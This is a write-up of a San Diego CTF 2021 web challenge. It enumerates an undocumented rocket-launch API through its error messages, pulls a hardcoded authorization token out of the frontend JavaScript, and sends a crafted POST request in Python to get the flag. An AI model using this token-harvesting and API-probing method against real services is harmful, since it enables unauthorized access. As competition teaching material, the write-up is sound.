# __San Diego CTF 2021__ 
## _Apolo 1337_

## Information

**Category:** | **Points:** | **Writeup Author**
--- | --- | ---
WEB | 123 | soska_nerealka

**Description:** 

> Hey there intern! We have a rocket launch scheduled for noon today and the launch interface is down. You'll need to directly use the API to launch the rocket. No, we don't have any documentation. And quickly, our shareholders are watching!
>
>Website: https://space.sdc.tf/

## Solution
We should find information about this website API. Lets start with looking at requests from frontend. 

There we find GET request with "https://space.sdc.tf/api/status?verbose=" URL. It looks incomplete with this empty query parameter, does not it? Lets try to make a GET request with "https://space.sdc.tf/api/status?verbose=true".

So we get
```
{
	"status": "health",
	"longStatus": "Healthy. All routes are functioning properly.",
	"version": "1.0.0",
	"routes": [
		{
			"path": "/status",
			"status": "healthy"
		},
		{
			"path": "/rocketLaunch",
			"status": "healthy"
		},
		{
			"path": "/fuel",
			"status": "healthy"
		}
	]
}
```
Lets send empty POST request on rocketLaunch
```
import requests
import json

url = 'https://space.sdc.tf/api/rocketLaunch'
data = {}
headers = {'Content-Type': 'application/json'}

x = requests.post(url, data=json.dumps(data), headers=headers)

print(x.text)
```
Api answers with "rocket not specified". Lets try to specify it.
```
data = {"rocket": "apolo"}
```
Api answers with "rocket not recognized (available: triton)".
```
data = {"rocket": "triton"}
```
Api answers with "launchTime not specified". But we know from the task description that it should be launched at noon.
```
data = {"rocket": "triton", "launchTime": "12:00"}
```
Api answers with "fuel pumpID not specified". We can look at the available fiels by making Get request to "https://space.sdc.tf/api/fuel".
Lets use first pumpID from there.
```
data = {"rocket": "triton", "launchTime": "12:00", "pumpID": 1}
```
Api answers with "/fuel/1 is either not active or not above 50% capacity"
Ok, lets find the appropriate pump then!
```
data = {"rocket": "triton", "launchTime": "12:00", "pumpID": 4}
```
Api answers with "frontend authorization token not specified". So we need to find it!
We can easily find this code in one of files that are loaded by this website.
```
 return Object(c.useEffect)((function () {
                        var e = {
                            method: "GET"
                        };
                        window.localStorage.getItem("debug") && (e.headers = {
                                Token: "yiLYDykacWp9sgPMluQeKkANeRFXyU3ZuxBrj2BQ"
                            }),
                            fetch("./api/status?verbose=", e).then((function (e) {
                                return e.json()
                            })).then((function (e) {
                                return n(e.longStatus)
                            }))
                    }), []),
```
So the final code looks like this:
```
import requests
import json

url = 'https://space.sdc.tf/api/rocketLaunch'
data = {'rocket': 'triton', 'launchTime': '12:00', "pumpID": 4, "token": "yiLYDykacWp9sgPMluQeKkANeRFXyU3ZuxBrj2BQ"}
headers = {'Content-Type': 'application/json'}

x = requests.post(url, data=json.dumps(data), headers=headers)

print(x.text)
```
> sdctf{0ne_sM@lL_sT3p_f0R_h@ck3r$}
